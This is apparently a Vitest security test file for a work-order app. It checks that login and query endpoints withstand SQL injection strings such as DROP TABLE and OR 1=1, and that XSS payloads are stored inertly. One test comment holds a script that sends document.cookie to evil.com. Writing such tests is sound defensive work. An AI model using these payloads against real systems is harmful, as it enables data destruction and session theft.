/**
 * Security Tests: Injection Prevention
 *
 * Tests:
 * - SQL injection attempts in login
 * - SQL injection in query parameters
 * - XSS in input fields
 * - Parameter sanitization
 */
import { describe, it, expect, beforeAll, afterAll, beforeEach, vi } from 'vitest';
import { initTestDatabase, cleanDatabase, disconnectTestDatabase, getTestPrisma } from '../../setup/db-setup';
import { createUser } from '../../factories/user.factory';
import { createCompany, createFullCompanySetup } from '../../factories/company.factory';
import { createMockRequest, parseJsonResponse, createAuthenticatedRequest } from '../../utils/test-helpers';

// Mock notifications
vi.mock('@/lib/notifications/notification-service', () => ({
  sendNotification: vi.fn().mockResolvedValue(undefined),
  default: { sendNotification: vi.fn() },
}));

vi.mock('@/lib/discord/agenda-notifications', () => ({
  sendDiscordNotification: vi.fn().mockResolvedValue(undefined),
}));

vi.mock('@/lib/automation/engine', () => ({
  triggerWorkOrderCreated: vi.fn().mockResolvedValue(undefined),
  triggerWorkOrderStatusChanged: vi.fn().mockResolvedValue(undefined),
  triggerWorkOrderAssigned: vi.fn().mockResolvedValue(undefined),
}));

describe('Injection Prevention', () => {
  const prisma = getTestPrisma();

  beforeAll(async () => {
    await initTestDatabase();
  });

  afterAll(async () => {
    await disconnectTestDatabase();
  });

  beforeEach(async () => {
    await cleanDatabase();
  });

  // ========================================================================
  // SQL Injection in Login
  // ========================================================================

  it('should handle SQL injection attempt in email field', async () => {
    const { POST } = await import('@/app/api/auth/login/route');

    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "admin'--",
      "' UNION SELECT * FROM users--",
      "'; DROP TABLE users;--",
      "' OR 1=1; --",
      "admin@test.com' AND '1'='1",
    ];

    for (const payload of sqlInjectionPayloads) {
      const request = createMockRequest('/api/auth/login', {
        method: 'POST',
        body: { email: payload, password: 'test123' },
      });

      const response = await POST(request);
      const { status } = await parseJsonResponse(response);

      // Should not cause a 500 (server error) - Prisma parameterizes queries
      expect(status).not.toBe(500);
      // Should return 401 (invalid credentials) or 400 (bad request)
      expect([400, 401, 429]).toContain(status);
    }
  });

  it('should handle SQL injection attempt in password field', async () => {
    const { user } = await createUser({ email: 'sqli-pw@test.com' });

    const { POST } = await import('@/app/api/auth/login/route');
    const request = createMockRequest('/api/auth/login', {
      method: 'POST',
      body: { email: user.email, password: "' OR '1'='1" },
    });

    const response = await POST(request);
    const { status } = await parseJsonResponse(response);

    // bcrypt.compare with injection string should just fail, not error
    expect(status).toBe(401);
  });

  // ========================================================================
  // SQL Injection in Query Parameters
  // ========================================================================

  it('should handle SQL injection in companyId parameter', async () => {
    const { company } = await createFullCompanySetup();
    const { user } = await createUser({ companyId: company.id, role: 'ADMIN' });

    const { GET } = await import('@/app/api/work-orders/route');
    const request = await createAuthenticatedRequest(
      '/api/work-orders?companyId=1;DROP TABLE "WorkOrder"',
      { userId: user.id, companyId: company.id, role: 'ADMIN' },
      { searchParams: { companyId: '1;DROP TABLE "WorkOrder"' } }
    );

    const response = await GET(request);
    const { status } = await parseJsonResponse(response);

    // parseInt('1;DROP TABLE...') returns 1, Prisma handles it safely
    // Should not crash or cause data loss
    expect([200, 400, 500]).toContain(status);

    // Verify the WorkOrder table still exists
    const count = await prisma.workOrder.count();
    expect(count).toBeGreaterThanOrEqual(0);
  });

  it('should handle SQL injection in status filter', async () => {
    const { company } = await createFullCompanySetup();
    const { user } = await createUser({ companyId: company.id, role: 'ADMIN' });

    const { GET } = await import('@/app/api/work-orders/route');
    const request = await createAuthenticatedRequest(
      "/api/work-orders?companyId=1&status=PENDING' OR '1'='1",
      { userId: user.id, companyId: company.id, role: 'ADMIN' },
      { searchParams: { companyId: String(company.id), status: "PENDING' OR '1'='1" } }
    );

    const response = await GET(request);
    const { status } = await parseJsonResponse(response);

    // Should not cause server error - Prisma uses parameterized queries
    expect(status).not.toBe(500);
  });

  // ========================================================================
  // XSS Prevention
  // ========================================================================

  it('should store XSS payloads as plain text (no execution)', async () => {
    const { company } = await createFullCompanySetup();
    const { user } = await createUser({ companyId: company.id, role: 'ADMIN' });

    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '"><script>alert(document.cookie)</script>',
      "javascript:alert('XSS')",
      '<svg/onload=alert("XSS")>',
    ];

    for (const payload of xssPayloads) {
      // Create a work order with XSS in the title
      const workOrder = await prisma.workOrder.create({
        data: {
          title: payload,
          createdById: user.id,
          companyId: company.id,
          status: 'PENDING',
          priority: 'LOW',
          type: 'CORRECTIVE',
        },
      });

      // The XSS payload should be stored as-is (not executed, not sanitized)
      // Sanitization should happen on the frontend
      expect(workOrder.title).toBe(payload);

      // Verify it's stored correctly in DB
      const dbWO = await prisma.workOrder.findUnique({ where: { id: workOrder.id } });
      expect(dbWO?.title).toBe(payload);
    }
  });

  it('should handle XSS in work order comments', async () => {
    const { company } = await createFullCompanySetup();
    const { user } = await createUser({ companyId: company.id, role: 'ADMIN' });

    const workOrder = await prisma.workOrder.create({
      data: {
        title: 'XSS Comment Test',
        createdById: user.id,
        companyId: company.id,
        status: 'PENDING',
        priority: 'LOW',
        type: 'CORRECTIVE',
      },
    });

    const xssComment = '<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>';

    const comment = await prisma.workOrderComment.create({
      data: {
        workOrderId: workOrder.id,
        userId: user.id,
        content: xssComment,
      },
    });

    // Should store the content as-is
    expect(comment.content).toBe(xssComment);
  });

  // ========================================================================
  // Large Input Handling
  // ========================================================================

  it('should handle very large input without crashing', async () => {
    const { POST } = await import('@/app/api/auth/login/route');

    const largeString = 'A'.repeat(10000);
    const request = createMockRequest('/api/auth/login', {
      method: 'POST',
      body: { email: largeString, password: largeString },
    });

    const response = await POST(request);
    const { status } = await parseJsonResponse(response);

    // Should not crash - just return error
    expect([400, 401, 429]).toContain(status);
  });

  // ========================================================================
  // Special Characters
  // ========================================================================

  it('should handle special characters in email without error', async () => {
    const { POST } = await import('@/app/api/auth/login/route');

    const specialEmails = [
      'user+tag@test.com',
      'user@subdomain.test.com',
      'user.name@test.com',
      'user@test.co.uk',
      'user%40test.com',
      'user@127.0.0.1',
    ];

    for (const email of specialEmails) {
      const request = createMockRequest('/api/auth/login', {
        method: 'POST',
        body: { email, password: 'test123' },
      });

      const response = await POST(request);
      const { status } = await parseJsonResponse(response);

      // Should handle gracefully (not 500)
      expect(status).not.toBe(500);
    }
  });

  it('should handle unicode characters in login fields', async () => {
    const { POST } = await import('@/app/api/auth/login/route');

    const request = createMockRequest('/api/auth/login', {
      method: 'POST',
      body: {
        email: 'ユーザー@テスト.com',
        password: 'пароль123',
      },
    });

    const response = await POST(request);
    const { status } = await parseJsonResponse(response);

    // Should handle gracefully (not crash)
    expect(status).not.toBe(500);
  });

  it('should handle null bytes in input', async () => {
    const { POST } = await import('@/app/api/auth/login/route');

    const request = createMockRequest('/api/auth/login', {
      method: 'POST',
      body: {
        email: 'user\0@test.com',
        password: 'pass\0word',
      },
    });

    const response = await POST(request);
    const { status } = await parseJsonResponse(response);

    expect(status).not.toBe(500);
  });
});
